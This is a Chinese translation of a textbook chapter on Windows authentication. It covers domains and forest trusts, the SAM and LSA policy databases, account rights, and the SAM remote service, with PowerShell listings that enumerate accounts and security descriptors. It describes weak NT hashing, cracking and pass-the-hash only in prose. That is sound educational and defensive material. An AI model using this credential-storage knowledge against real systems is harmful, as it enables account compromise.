---
summary: 《Windows Security Internals》（Windows安全内部原理）第3卷：本地安全机构（LSA）与身份验证体系。深入讲解 Windows 身份验证协议与域安全攻防底层机理。核心模块包括：1. LSA 架构与安全支持提供程序接口（SSPI/SSP），详析 SAM 与 SECURITY 数据库、LSA Secrets 与凭据存储；2. Active Directory 域安全架构，涵盖 LDAP 目录对象、架构 Schema、AD 安全描述符与访问检查、组策略（GPO）底层控制；3. 交互式登录（Interactive Authentication），剖析 Winlogon、凭据提供程序（Credential Provider）与 LsaLogonUser 内部执行流程；4. 网络身份验证与 NTLM 协议，深度拆解 NTLM 挑战/响应、NetNTLM 哈希与 NTLM 中继攻击（NTLM Relay）；5. Kerberos 认证协议全流程，详解 TGT/TGS 票据交互、PAC 特权属性证书与签名校验、跨域信任认证、Kerberos 委派（Constrained/Unconstrained/RBCD）与用户到用户（U2U）认证；6. 协商认证（SPNEGO）、远程凭据保护（Remote Credential Guard）、受限管理模式与认证审计；附录附带完整测试域网络搭建指南与 SDDL SID 别名全量映射表。红蓝对抗与内网渗透领域核心技术宝典。
---

## 10. Windows 身份验证

在与Windows系统交互之前，您需要完成其复杂的身份验证过程，该过程将一组凭据（如用户名和密码）转换为代表用户身份的令牌对象。

身份验证是一个庞大的主题，无法在一章中涵盖；因此，我将其分为三个部分。本章和下一章将概述Windows身份验证、操作系统如何存储用户配置，以及如何检查该配置。在接下来的章节中，我们将讨论*交互式身份验证*，即用于直接与Windows系统交互（如通过GUI）的机制。本书的最后章节涵盖*网络身份验证*，这是一种允许未物理连接到系统的用户提供凭据并生成代表其身份的令牌对象的身份验证类型。例如，如果您使用文件共享网络连接连接到Windows系统，您将在底层使用网络身份验证来提供访问文件共享所需的身份。

本章首先概述域身份验证。然后，我们将深入探讨身份验证配置如何在本地存储，以及如何使用PowerShell访问该配置。最后，我们将概述Windows如何在内部存储本地配置，以及如何利用这些知识提取用户的哈希密码。

为了充分利用这些身份验证章节，我建议按照附录A中的描述设置域网络虚拟机。您仍然可以在不设置域网络的情况下运行许多示例，但任何需要网络域的命令在没有域网络的情况下将无法运行。另请注意，某些命令的实际输出可能会根据您设置虚拟机的方式而有所不同，但总体概念应保持一致。

### 域身份验证

出于身份验证的目的，Windows 将用户和组划分为域。*域*为如何访问资源提供了用户和组的策略；同时，它也存储了诸如密码等配置信息。Windows 域架构的复杂性足以单独成书。然而，在深入探讨身份验证配置之前，您应该熟悉一些基本概念。

#### 本地身份验证

Windows 中最简单的域存在于独立计算机上，如图 10-1 所示。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure10-1.webp)

图 10-1：独立计算机上的本地域

计算机上的用户和组只能访问本地资源。本地域具有*本地策略*，该策略定义了计算机上的应用程序和安全配置。域被赋予与计算机相同的名称：在此示例中为 *GRAPHITE*。如果您没有配置企业网络，本地域将是您唯一能够检查的域类型。

#### 企业网络域

图 10-2 展示了下一级别的复杂性，即企业网络域。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure10-2.webp)

图 10-2：单一企业网络域

企业网络域不再要求每个单独的工作站或服务器维护自己的用户和组，而是将这些信息集中维护在*域控制器*上。它将用户配置存储在域控制器上名为 *Active Directory* 的数据库中。当用户想要向域进行身份验证时，计算机会将身份验证请求传递给域控制器，域控制器知道如何使用用户配置来验证该请求。我们将在第 12 章和第 14 章讨论交互式身份验证和 Kerberos 时，详细介绍域身份验证请求的处理方式。

多个域控制器可以管理同一个域；域控制器使用特殊的复制协议来复制配置，以确保它们始终是最新的。拥有多个域控制器可以确保冗余：如果某个域控制器发生故障，另一个域控制器可以为域中的计算机和用户提供身份验证服务。

每个域控制器还维护*组策略*，网络中的计算机可以查询该策略，以使用通用的域策略自动配置自身。此组策略可以覆盖现有的本地策略和安全配置，从而更容易管理大型企业网络。每台计算机都有一个特殊的用户帐户，允许它们向域进行身份验证。这使得计算机无需域用户进行身份验证即可访问组策略配置。

自 Windows 2000 以来，域的名称一直是 DNS 名称；在图 10-2 中，它是 *mineral.local*。为了与不支持 DNS 名称的旧版 Windows 或应用程序兼容，操作系统还提供了一个简单的域名。例如，在此情况下，简单名称可能是 *MINERAL*，尽管管理员在设置域时可以自由选择自己的简单名称。

请注意，即使配置了企业网络域，单个计算机上的本地域仍然存在。用户始终可以使用该计算机特有的凭据向其计算机（本地域）进行身份验证，除非管理员通过更改系统上的本地策略来禁用此选项。然而，即使计算机本身已加入域，这些本地凭据也无法用于访问企业网络中的远程资源。

本地组还决定了域用户进行身份验证时获得的访问权限。例如，如果域用户位于本地 *Administrators* 组中，那么他们将成为本地计算机的管理员。但是，该访问权限不会扩展到该计算机之外。用户在一台计算机上是本地管理员，并不意味着他们会在网络上的另一台计算机上获得管理员访问权限。

#### 域林

下一层级的复杂性是*域林*。在此上下文中，*林*指的是一组相关域的集合。这些域可能共享共同的配置或组织结构。在图10-3中，三个域构成了该林：*mineral.local*，作为林的根域，以及两个子域，*engineering.mineral.local*和*sales.mineral.local*。每个域维护自己的用户、计算机和组策略。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure10-3.webp)

图10-3：域林

从安全角度来看，林中一些最重要的特性是其*信任关系*。一个域可以配置为信任另一个域的用户和组。这种信任可以是*单向*的，即一个域信任另一个域的用户，但反之不成立；也可以是*双向*的，即每个域都信任对方的用户。例如，在图10-3中，根域与*engineering.mineral.local*域之间存在双向信任。这意味着任一域中的用户可以自由访问另一个域中的资源。*sales.mineral.local*与根域之间也存在双向信任。默认情况下，当新域添加到现有林中时，父域和子域之间会建立双向信任关系。

请注意，*engineering.mineral.local*和*sales.mineral.local*域之间没有显式的信任关系。相反，这两个域具有双向*传递信任*关系；由于两个域都与共同父域有双向信任关系，父域允许engineering域中的用户访问sales域中的资源，反之亦然。我们将在第14章中讨论信任关系是如何实现的。

林中还包含一个共享的*全局编录*。此编录是林中所有Active Directory数据库中存储信息的子集。它允许一个域或子树中的用户无需分别访问每个域即可找到林中的资源。

您可以通过建立林间信任关系来组合多个林，如图10-4所示。这些信任关系也可以是单向或双向的，并且可以根据需要在整个林之间或单个域之间建立。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure10-4.webp)

图10-4：具有信任关系的多个林

一般来说，林间信任关系不是传递的。因此，虽然在图10-4中*vegetable.local*信任*mineral.local*，但它不会自动信任*sales.animal.local*域中的任何内容，即使*sales.animal.local*和*sales.mineral.local*之间存在双向信任关系。

> 注意
>
> *管理信任关系可能很复杂，尤其是当域和林的数量增长时。可能会无意中创建信任关系，恶意用户可利用这些关系来危害企业网络。我不会讨论如何分析这些关系以发现安全问题；但是，安全工具BloodHound (*https://github.com/SpecterOps/BloodHound*) 可以帮助解决此问题。*

接下来的几章将重点介绍本地域和简单林的配置。如果您想了解更复杂的域关系，Microsoft技术文档是一个很好的资源。现在，让我们继续详细说明本地域如何存储身份验证配置。

### 本地域配置

在Windows系统为用户创建令牌对象之前，用户必须先进行身份验证；而要向系统验证身份，用户必须提供身份证明。这可能是用户名和密码、智能卡或生物特征（如指纹）等形式。

系统必须安全地存储这些凭据，以便用于验证用户身份，但不得公开披露。对于本地域配置，这些信息由*本地安全机构(Local Security Authority, LSA)*维护，该机构在LSASS进程中运行。图10-5概述了LSA维护的本地域配置数据库。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure10-5.webp)

图10-5：本地域配置数据库

LSA公开了各种API，像PowerShell这样的应用程序可以调用这些API。这些API访问两个配置数据库：用户数据库和LSA策略数据库。让我们逐一了解每个数据库中存储的信息以及如何从PowerShell访问它们。

#### 用户数据库

*用户数据库*存储两类信息容器，用于本地身份验证。一个容器保存本地用户名、其SID和密码。另一个保存本地组名称、其SID和用户成员资格。我们将逐一查看。

##### 检查本地用户账户

您可以使用PowerShell内置的Get-LocalUser命令检查本地用户账户（代码清单 10-1）。


```
PS> Get-LocalUser | Select-Object Name, Enabled, Sid
Name               Enabled SID
----               ------- ---
admin              True    S-1-5-21-2318445812-3516008893-216915059-1001
Administrator      False   S-1-5-21-2318445812-3516008893-216915059-500
DefaultAccount     False   S-1-5-21-2318445812-3516008893-216915059-503
Guest              False   S-1-5-21-2318445812-3516008893-216915059-501
user               True    S-1-5-21-2318445812-3516008893-216915059-1002
WDAGUtilityAccount False   S-1-5-21-2318445812-3516008893-216915059-504
```


*代码清单 10-1：使用Get-LocalUser命令显示本地用户账户*

此命令列出设备上所有本地用户的名称和SID，并指示每个用户是否已启用。如果用户未启用，LSA将不允许该用户进行身份验证，即使他们提供了正确的密码。

您会注意到所有SID都有一个共同的前缀；只有最后的RID不同。这个共同前缀是*机器SID*，它在Windows安装时随机生成。由于是随机生成的，每台机器都应有唯一的机器SID。您可以使用Get-NtSid并指定本地计算机的名称来获取机器SID，如代码清单 10-2所示。


```
PS> Get-NtSid -Name $env:COMPUTERNAME
Name      Sid
----      ---
GRAPHITE\ S-1-5-21-2318445812-3516008893-216915059
```


*代码清单 10-2：查询机器SID*

没有方法可以通过公共API提取本地用户的密码。无论如何，默认情况下，Windows不存储实际密码；而是存储密码的MD4哈希，通常称为*NT哈希*。当用户进行身份验证时，他们向LSA提供密码，LSA使用相同的MD4哈希算法对其进行哈希处理，并与用户数据库中的值进行比较。如果匹配，LSA假定用户知道密码，身份验证即被确认。

您可能会担心使用过时的消息摘要算法（MD4）进行密码哈希是不安全的——您的担心是对的。访问NT哈希是有用的，因为您可能能够破解密码以获取原始文本版本。您还可以使用一种称为*传递哈希*的技术来执行远程网络身份验证，而无需原始密码。

> 注意
>
> *Windows过去曾与NT哈希一起存储单独的*LAN Manager（LM）哈希*。自Windows Vista以来，默认情况下已禁用此功能。LM哈希非常弱；例如，生成哈希的密码不能超过14个大写字符。破解LM哈希密码比破解NT哈希（同样较弱）要简单得多。*

您可以使用New-LocalUser命令创建新的本地用户，如代码清单 10-3所示。您需要为用户提供用户名和密码。您还需要以管理员身份运行此命令；否则，很容易在本地系统上获得额外特权。




```
❶ PS> $password = Read-Host -AsSecureString -Prompt "Password"
Password: ********

PS> $name = "Test"
❷ PS> New-LocalUser -Name $name -Password $password -Description "Test User"
Name Enabled Description
---- ------- -----------
Test True    Test User

❸ PS> Get-NtSid -Name "$env:COMPUTERNAME\$name"
Name          Sid
----          ---
GRAPHITE\Test S-1-5-21-2318445812-3516008893-216915059-1003
```


*代码清单 10-3：创建新的本地用户*

要创建新的本地用户，首先我们必须获取用户的密码❶。此密码必须是安全字符串，因此我们将AsSecureString参数传递给Read-Host命令。然后我们使用New-LocalUser命令创建用户，向其传递用户名和安全密码❷。如果未返回错误，则创建成功。

创建用户后，我们可以查询LSA为新用户分配的SID。为此，我们使用`Get-NtSid`命令，并传入用户的完整名称，包括本地计算机名❸。您会注意到，该SID由机器SID和递增的最终RID组成。在此例中，下一个RID是1003，但根据本地创建的其他用户或组，它可能是任何值。

安全字符串

当您读取安全字符串时，您创建的是.NET `System.Security.SecureString`类的实例，而不是普通字符串。安全字符串使用加密来解决.NET在处理密码等敏感信息时可能存在的安全问题。当开发人员调用需要密码的Win32 API时，包含密码的内存可以被分配一次，当不再需要时，可以将其清零，以防止被其他进程读取或无意中写入存储。但在.NET运行时中，开发人员无法直接控制内存分配。运行时可以移动对象内存分配，并且只有在垃圾收集器执行并发现内存未被引用时才会释放内存。运行时无法保证内存缓冲区在移动或释放时会被清零。

因此，如果您将密码存储在普通字符串中，就无法确保它不会残留在内存中，从而可能被他人读取。`SecureString`类在内存中加密字符串，并且仅在需要传递给本机代码时解密。解密后的内容存储在本机内存分配中，这使调用者能够确保该值未被复制，并且可以在释放前清零。

要从本地系统删除在代码清单 10-3中创建的用户，请使用`Remove-LocalUser`命令：

```
PS> Remove-LocalUser -Name $name
```

请注意，此命令仅删除账户；删除操作并不保证用户可能创建的任何资源都会被移除。因此，LSA不应重用RID：这可能会允许新用户访问先前已删除用户账户的资源。

##### 检查本地组

您可以通过使用`Get-LocalGroup`命令，以类似于检查用户的方式检查本地组（代码清单 10-4）。

```
PS> Get-LocalGroup | Select-Object Name, Sid
Name                    SID
----                    ---
Awesome Users           S-1-5-21-2318445812-3516008893-216915059-1002
Administrators          S-1-5-32-544
Backup Operators        S-1-5-32-551
Cryptographic Operators S-1-5-32-569
--snip--
```

*代码清单 10-4：使用`Get-LocalGroup`命令显示本地组*

您会注意到列表中有两种类型的SID。第一组*Awesome Users*的SID以机器SID为前缀。这是一个本地定义的组。其余组的SID具有不同的前缀。正如我们在第5章中所见，这是*BUILTIN*域的域SID。这些组，如*BUILTIN\Administrators*，是随用户数据库默认创建的。

用户数据库中的每个本地组都有一个成员列表，成员可以是用户或其他组。我们可以使用`Get-LocalGroupMember`命令获取组成员列表，如代码清单 10-5所示。

```
PS> Get-LocalGroupMember -Name "Awesome Users"
ObjectClass Name                     PrincipalSource
----------- ----                     ---------------
User        GRAPHITE\admin           Local
Group       NT AUTHORITY\INTERACTIVE Unknown
```

*代码清单 10-5：显示* Awesome Users *组的本地组成员*

代码清单 10-5为*Awesome Users*组的每个成员显示了三列。ObjectClass列表示条目的类型（在此例中为User或Group）。如果添加了一个组作为条目，则该组的所有成员也将是外层组的成员。因此，此输出表明*INTERACTIVE*组的所有成员也是*Awesome Users*组的成员。

代码清单 10-6展示了如何使用`New-LocalGroup`和`Add-LocalGroupMember`命令添加新组和新组成员。您需要以管理员身份运行这些命令。

```
PS> $name = "TestGroup"
❶ PS> New-LocalGroup -Name $name -Description "Test Group"
Name      Description
----      -----------
TestGroup Test Group

❷ PS> Get-NtSid -Name "$env:COMPUTERNAME\$name"
Name               Sid
----               ---
GRAPHITE\TestGroup S-1-5-21-2318445812-3516008893-216915059-1005

❸ PS> Add-LocalGroupMember -Name $name -Member "$env:USERDOMAIN\$env:USERNAME"
PS> Get-LocalGroupMember -Name $name
ObjectClass Name           PrincipalSource
----------- ----           ---------------
❹ User        GRAPHITE\admin Local
```

*代码清单 10-6：添加新的本地组和组成员*

我们首先添加一个新的本地组，指定组的名称❶。与用户一样，我们可以使用`Get-NtSid`命令查询组的SID❷。

要向组中添加新成员，我们使用`Add-LocalGroupMember`命令，指定组和要添加的成员❸。查询组成员身份显示用户已成功添加❹。请注意，该用户在下一次成功进行身份验证之前，不会获得额外组的访问权限；也就是说，该组不会自动添加到该用户的现有令牌中。

要删除在代码清单 10-6中添加的本地组，请使用`Remove-LocalGroup`命令：


```
PS> Remove-LocalGroup -Name $name
```


关于用户数据库，我们就说到这里。接下来，让我们转向LSA维护的另一个数据库：策略数据库。

#### LSA策略数据库

LSA维护的第二个数据库是LSA策略数据库，它存储账户权限以及相关的附加信息，例如我们在第9章中介绍的系统审计策略，以及用于保护各种系统服务和凭据的任意机密对象。我们将在本节介绍账户权限，并在本章稍后讨论对LSA策略数据库的远程访问时介绍机密。

*账户权限*定义了用户身份验证时其令牌将被分配哪些特权，以及用户可以使用哪些机制进行身份验证（登录权限）。与本地组类似，它们包含成员用户和组的列表。我们可以使用PowerShell模块的`Get-NtAccountRight`命令检查分配的账户权限，如代码清单 10-7所示。




```
PS> Get-NtAccountRight -Type Privilege
Name                          Sids
----                          ----
SeCreateTokenPrivilege
SeAssignPrimaryTokenPrivilege NT AUTHORITY\NETWORK SERVICE, ...
SeLockMemoryPrivilege
SeIncreaseQuotaPrivilege      BUILTIN\Administrators, ...
SeMachineAccountPrivilege
SeTcbPrivilege
SeSecurityPrivilege           BUILTIN\Administrators
SeTakeOwnershipPrivilege      BUILTIN\Administrators
--snip--
```


*代码清单 10-7：显示本地系统的特权账户权限*

在此例中，我们通过指定适当的`Type`值仅列出特权。在输出中，我们可以看到每个特权的名称（这些在第4章中有描述），以及包含被分配该特权的用户或组的列。您需要以管理员身份运行该命令才能查看SID列表。

您会注意到其中一些条目是空的。然而，这并不一定意味着没有用户或组被分配此特权；例如，当创建*SYSTEM*用户令牌时，诸如`SeTcbPrivilege`之类的特权会自动分配，而无需参考账户权限分配。

> 注意
>
> *如果您将某些高级特权分配给用户（例如`SeTcbPrivilege`，它允许绕过安全控制），即使该用户不在* Administrators *组中，也会使其等同于管理员。当我们讨论令牌创建时，将在第12章中看到一个这种情况很重要的示例。*

我们可以使用相同的`Get-NtAccountRight`命令，但使用不同的`Type`值来列出登录账户权限。请以管理员身份运行代码清单 10-8中的命令。


```
PS> Get-NtAccountRight -Type Logon
Name                              Sids
----                              ----
SeInteractiveLogonRight           BUILTIN\Backup Operators, BUILTIN\Users, ...
SeNetworkLogonRight               BUILTIN\Backup Operators, BUILTIN\Users, ...
SeBatchLogonRight                 BUILTIN\Administrators, ...
SeServiceLogonRight               NT SERVICE\ALL SERVICES, ...
SeRemoteInteractiveLogonRight     BUILTIN\Remote Desktop Users, ...
SeDenyInteractiveLogonRight       GRAPHITE\Guest
SeDenyNetworkLogonRight           GRAPHITE\Guest
SeDenyBatchLogonRight
SeDenyServiceLogonRight
SeDenyRemoteInteractiveLogonRight
```


*代码清单 10-8：显示本地系统的登录账户权限*

阅读第一列中的名称，您可能会认为它们看起来像特权；然而，它们不是。登录权限表示用户或组可以执行的身份验证角色。每个权限都有允许和拒绝两种形式，如表10-1所述。

| 允许权限                     | 拒绝权限                          | 描述                                                         |
| :--------------------------- | :-------------------------------- | :----------------------------------------------------------- |
| SeInteractiveLogonRight      | SeDenyInteractiveLogonRight       | 进行交互式会话的身份验证。                                   |
| SeNetworkLogonRight          | SeDenyNetworkLogonRight           | 从网络进行身份验证。                                         |
| SeBatchLogonRight            | SeDenyBatchLogonRight             | 在没有交互式控制台会话的情况下对本地系统进行身份验证。       |
| SeServiceLogonRight          | SeDenyServiceLogonRight           | 对服务进程进行身份验证。                                     |
| SeRemoteInteractiveLogonRight | SeDenyRemoteInteractiveLogonRight | 进行身份验证以与远程桌面交互。                               |

如果用户或组未被分配登录权限，他们将不会获得以该角色进行身份验证的权限。例如，如果未获得`SeInteractiveLogonRight`的用户尝试对物理控制台进行身份验证，他们将失败访问。但是，如果该用户获得`SeNetworkLogonRight`，则可能仍然能够通过网络连接到Windows系统以访问文件共享并成功进行身份验证。拒绝权限在允许权限之前被检查，因此您可以允许一个通用组（如*Users*），然后拒绝特定账户。

PowerShell模块还提供了修改用户权限分配的命令。您可以使用`Add-NtAccountRight`命令向账户权限中添加SID。要移除SID，请使用`Remove-NtAccountRight`命令。我们将在第12章中看到如何使用这些命令的示例。

### 远程 LSA 服务

上一节演示了如何在本地系统上与 LSA 通信，并使用 `Get-LocalUser` 和 `Get-NtAccountRight` 等命令从 PowerShell 中的配置数据库中提取信息。我之前将这些信息访问机制描述为一组本地 API，但实际上情况要复杂得多。图 10-6 展示了两个本地域配置数据库是如何暴露给 PowerShell 等应用程序的。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure10-6.webp)

图 10-6：LSA 的远程服务和对象

以 `Get-LocalUser` 命令为例，它调用 Win32 API 来枚举本地用户。用户数据库存储在*安全账户管理器(Security Account Manager, SAM)数据库*中，并通过*SAM 远程服务*进行访问。要枚举本地 SAM 数据库中的用户列表，应用程序必须首先请求访问域对象。通过该域对象，API 可以查询用户列表，或者不同的 API 可以枚举本地组或别名。

另一方面，LSA 策略数据库存储在 SECURITY 数据库中，要访问它，我们使用*域策略远程服务*。

虽然用于访问 SAM 和 SECURITY 数据库的网络协议不同，但它们有一些共同的模式：

- 客户端首先请求连接到数据库。
- 连接建立后，客户端可以请求访问单个对象，如域或用户。
- 数据库和对象具有配置的安全描述符(Security Descriptor)，用于控制访问。

PowerShell 命令与本地 LSA 交互，但相同的网络协议也可用于查询企业网络中另一台机器上的 LSA。为了更好地理解数据库访问的工作原理，我们需要使用底层 API 来驱动协议，因为 `Get-LocalUser` 等命令使用的高级 API 隐藏了大部分复杂性和结构。以下各节讨论如何直接访问数据库以检查其安全信息和配置。

#### SAM 远程服务

Microsoft 在 *MS-SAMR* 文档中记录了用于访问 SAM 的服务，该文档可在线获取。幸运的是，我们不需要自己重新实现这个协议。我们可以使用 `SamConnect` Win32 API 建立到 SAM 的连接，该 API 返回一个句柄，供后续请求使用。

在 代码清单 10-9 中，我们使用 `Connect-SamServer` 命令建立到 SAM 的连接，该命令封装了 `SamConnect` API。

```
PS> $server = Connect-SamServer -ServerName 'localhost'
PS> Format-NtSecurityDescriptor $server -Summary -MapGeneric
<Owner> : BUILTIN\Administrators
<Group> : BUILTIN\Administrators
<DACL>
Everyone: (Allowed)(None)(Connect|EnumerateDomains|LookupDomain|ReadControl)
BUILTIN\Administrators: (Allowed)(None)(Full Access)
NAMED CAPABILITIES\User Signin Support: (Allowed)(None)(GenericExecute|GenericRead)
```


*代码清单 10-9：连接到 SAM 并显示其安全描述符*

您可以使用 `ServerName` 属性指定包含 SAM 的服务器名称。在本例中，我们使用 *localhost*（为了清晰起见；指定此值是多余的，因为它是该命令的默认值）。该连接具有关联的安全描述符，我们使用 第 5 章 中介绍的 `Format-NtSecurityDescriptor` 命令进行查询。

> 注意
>
> *在 第 6 章 中，我们讨论了使用 `Set-NtSecurityDescriptor` 命令修改安全描述符。您可以使用它来授予其他用户对 SAM 的访问权限，但不建议这样做；如果操作不当，可能会授予低权限用户 SAM 访问权限，从而导致权限提升，甚至远程入侵 Windows 系统。*

您可以使用 `Access` 参数在连接上请求特定的访问权限。如果未指定（如 代码清单 10-9 中的情况），该命令将请求最大允许的访问权限。以下是 SAM 服务器连接定义的访问权限：

Connect  允许连接到 SAM 服务器

Shutdown  允许关闭 SAM 服务器

Initialize  允许初始化 SAM 数据库

CreateDomain  允许在 SAM 数据库中创建新域

EnumerateDomains  允许枚举 SAM 数据库中的域

LookupDomain  允许从 SAM 数据库中查找域信息

要连接到 SAM 服务器，安全描述符必须授予调用者 Connect 访问权限。Shutdown、Initialize 和 CreateDomain 访问权限是为 SAM 服务不再支持的操作定义的。

> 注意
>
> *默认配置仅允许计算机本地* Administrators *组成员远程访问 SAM。如果调用者不是本地管理员，无论 SAM 上的安全描述符如何配置，访问都将失败。Windows 10 引入了这一额外限制，以增加恶意用户枚举域加入系统上的本地用户和组或利用薄弱安全配置的难度。此限制不适用于域控制器或本地访问 SAM 的情况。*

##### 域对象

*域对象* 是 SAM 暴露的可安全资源。连接上的 EnumerateDomains 访问权限允许您枚举 SAM 数据库中的域名，而 LookupDomain 则允许您将这些名称转换为 SID，这是使用 SamOpenDomain API 打开域对象所必需的。

PowerShell 在 Get-SamDomain 命令中实现了此 API。在 代码清单 10-10 中，我们使用它来检查 SAM 数据库中的域配置。


```
PS> Get-SamDomain -Server $server -InfoOnly
Name     DomainId
----     --------
GRAPHITE S-1-5-21-2318445812-3516008893-216915059
Builtin  S-1-5-32

PS> $domain = Get-SamDomain -Server $server -Name "$env:COMPUTERNAME"
PS> $domain.PasswordInformation
MinimumLength : 7
HistoryLength : 24
Properties    : Complex
MaximumAge    : 42.00:00:00
MinimumAge    : 1.00:00:00
```


*代码清单 10-10：枚举并打开域*

我们首先枚举 SAM 可访问的域。由于我们使用了 InfoOnly 参数，此命令不会打开任何域对象；它只会返回名称和域 SID。我们查询的是工作站，因此第一个条目是本地工作站名称，本例中为 *GRAPHITE*，以及本地机器 SID。第二个是内置域，其中包含诸如 *BUILTIN\Administrators* 之类的组。

请注意，如果正在枚举的域位于域控制器上，SAM 服务不会查询本地 SAM 数据库。相反，该服务会从 Active Directory 访问用户数据。在这种情况下，整个域将取代本地域对象；无法直接在域控制器上查询本地用户。我们将在 第 11 章 中看到如何使用 Active Directory 的原生网络协议访问相同的信息。

我们可以使用相同的命令通过指定名称或 SID 直接打开域对象。在本例中，我们选择使用名称。由于域是一个可安全对象，您可以从以下列表中选择特定的访问权限来打开域对象：

ReadPasswordParameters  允许读取密码参数（如策略）

WritePasswordParams  允许写入密码参数

ReadOtherParameters  允许读取一般域信息

WriteOtherParameters  允许写入一般域信息

CreateUser  允许创建新用户

CreateGroup  允许创建新组

CreateAlias  允许创建新别名

GetAliasMembership  允许获取别名的成员资格

ListAccounts  允许枚举域中的用户、组或别名

Lookup  允许查找用户、组或别名的名称或 ID

AdministerServer  允许更改域配置，如域复制

拥有适当的访问权限后，您可以读取或写入域对象的属性。例如，如果您获得了 ReadPasswordParameters 访问权限，您可以使用 PasswordInformation 属性查询域的密码策略，如我们在 代码清单 10-10 中所做的那样。

如果您获得了 ListAccounts 访问权限，您还可以使用域对象枚举其他三种类型的资源：用户、组和别名。我们将在以下各节中逐一介绍这些内容。

##### 用户对象

*用户对象* 代表您所期望的内容：一个本地用户账户。您可以使用 SamOpenUser API 或 Get-SamUser PowerShell 命令打开用户对象。代码清单 10-11 展示了如何使用 Get-SamUser 命令枚举域中的用户。




```
PS> Get-SamUser -Domain $domain -InfoOnly
Name               Sid
----               ---
admin              S-1-5-21-2318445812-3516008893-216915059-1001
Administrator      S-1-5-21-2318445812-3516008893-216915059-500
DefaultAccount     S-1-5-21-2318445812-3516008893-216915059-503
Guest              S-1-5-21-2318445812-3516008893-216915059-501
user               S-1-5-21-2318445812-3516008893-216915059-1002
WDAGUtilityAccount S-1-5-21-2318445812-3516008893-216915059-504

❶ PS> $user = Get-SamUser -Domain $domain -Name "WDAGUtilityAccount"
PS> $user.UserAccountControl
❷ AccountDisabled, NormalAccount
PS> Format-NtSecurityDescriptor $user -Summary
<Owner> : BUILTIN\Administrators
<Group> : BUILTIN\Administrators
<DACL>
❸ Everyone: (Allowed)(None)(ReadGeneral|ReadPreferences|ReadLogon|ReadAccount|
ChangePassword|ListGroups|ReadGroupInformation|ReadControl)
❹ BUILTIN\Administrators: (Allowed)(None)(Full Access)
GRAPHITE\WDAGUtilityAccount: (Allowed)(None)(WritePreferences|ChangePassword|
ReadControl)
```


*代码清单 10-11：枚举域中的用户*

此处返回的用户名和 SID 列表应与 代码清单 10-1 中的输出匹配，我们在那里使用了 Get-LocalUser 命令。要获取有关用户的更多信息，您需要打开用户对象 ❶。

在打开的用户对象上，可以查询的一个属性是用户账户控制标志列表。这些标志定义了用户的各种属性。在本例中，由于我们打开了 *WDAGUtilityAccount* 用户，发现其设置了 AccountDisabled 标志 ❷。这与 代码清单 10-1 中的输出一致，该输出显示此用户账户的 Enabled 值为 False。

与连接和域类似，每个用户对象都可以配置自己的安全描述符。这些描述符可以授予以下访问权限：

ReadGeneral  允许读取常规属性；例如，用户名和全名属性

ReadPreferences  允许读取首选项；例如，用户的文本代码页首选项

WritePreferences  允许写入首选项；例如，用户的文本代码页首选项

ReadLogon  允许读取登录配置和统计信息；例如，上次登录时间

ReadAccount  允许读取账户配置；例如，用户账户控制标志

WriteAccount  允许写入账户配置；例如，用户账户控制标志

ChangePassword  允许更改用户密码

ForcePasswordChange  允许强制更改用户密码

ListGroups  允许列出用户的组成员身份

ReadGroupInformation  当前未使用

WriteGroupInformation  当前未使用

这些访问权限中最有趣的可能是 ChangePassword 和 ForcePasswordChange。前者允许通过诸如 SamChangePassword 之类的 API 更改用户密码。要成功执行此操作，调用者必须提供旧密码以及要设置的新密码。如果旧密码与当前设置的密码不匹配，服务器将拒绝更改请求。您可以在 代码清单 10-11 中看到，*Everyone* 组 ❸ 和 *WDAGUtilityAccount* 用户获得了 ChangePassword 访问权限。

然而，在某些情况下，管理员可能需要能够更改用户密码，即使他们不知道之前的密码（例如，如果用户忘记了密码）。获得用户对象上 ForcePasswordChange 访问权限的调用者可以分配新密码，而无需知道旧密码。在这种情况下，密码通过 SamSetInformationUser API 设置。在 代码清单 10-11 中，只有 *Administrators* 组获得了 ForcePasswordChange 访问权限 ❹。

##### 组对象

*组对象* 在创建用户令牌时配置其组成员身份。我们可以使用 Get-SamGroup 命令枚举域中的组，并使用 Get-SamGroupMember 枚举组的成员，如 代码清单 10-12 所示。




```
PS> Get-SamGroup -Domain $domain -InfoOnly
Name Sid
---- ---
None S-1-5-21-2318445812-3516008893-216915059-513
❶ PS> $group = Get-SamGroup $domain -Name "None"
❷ PS> Get-SamGroupMember -Group $group
RelativeId                           Attributes
----------                           ----------
       500 Mandatory, EnabledByDefault, Enabled
       501 Mandatory, EnabledByDefault, Enabled
       503 Mandatory, EnabledByDefault, Enabled
       504 Mandatory, EnabledByDefault, Enabled
      1001 Mandatory, EnabledByDefault, Enabled
      1002 Mandatory, EnabledByDefault, Enabled
```


*代码清单 10-12：列出域组对象并枚举成员*

此命令的输出可能会让您感到惊讶。我们在 代码清单 10-4 中作为 Get-LocalGroup 命令输出看到的其他组在哪里？此外，如果您检查之前的输出，您不会找到 *None* 组，尽管我们在这里看到它返回了。这是怎么回事？

首先，Get-LocalGroup 命令返回本地域和单独的 *BUILTIN* 域中的组。在 代码清单 10-12 中，我们只查看本地域，因此不会期望看到诸如 *BUILTIN\Administrators* 之类的组。

其次，`None` 组被 `Get-LocalGroup` 使用的更高层 API 隐藏了，因为它并不是一个供你正常修改的组。它由 **LSA（Local Security Authority，本地安全机构）** 管理；当创建新用户时，LSA 会自动向其中添加相应成员。

如果我们打开该组 ❶，并使用 `Get-SamGroupMember` 命令 ❷ 列出其成员，就会看到，成员存储的是用户的 **相对标识符（RID）**，以及该成员的组属性。

注意，这个组并不存储成员的完整 SID。这意味着一个组只能包含**同一域中的成员**，这极大地限制了它们的用途。这也是为什么更高层的 API 不提供简单的方法来操作这些组。

有趣的是，对于一个域对象，其默认安全描述符甚至不会授予任何主体 `CreateGroup` 访问权。该访问权用于创建新的组对象。Windows 确实不希望您使用组对象（尽管，如果您真的想，您可以以管理员身份手动更改安全描述符以允许组创建成功）。

##### 别名对象

